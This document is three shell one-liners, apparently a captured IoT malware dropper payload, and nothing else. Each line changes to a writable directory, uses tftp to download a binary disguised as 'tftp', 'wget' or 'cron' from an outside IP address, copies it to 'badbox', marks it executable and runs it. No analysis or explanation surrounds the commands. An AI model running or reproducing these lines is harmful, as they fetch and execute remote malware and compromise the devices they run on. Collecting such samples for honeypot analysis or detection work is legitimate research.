cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 78.129.171.131;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 78.129.171.131;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 78.129.171.131;cat cron >badbox;chmod +x *;./badbox
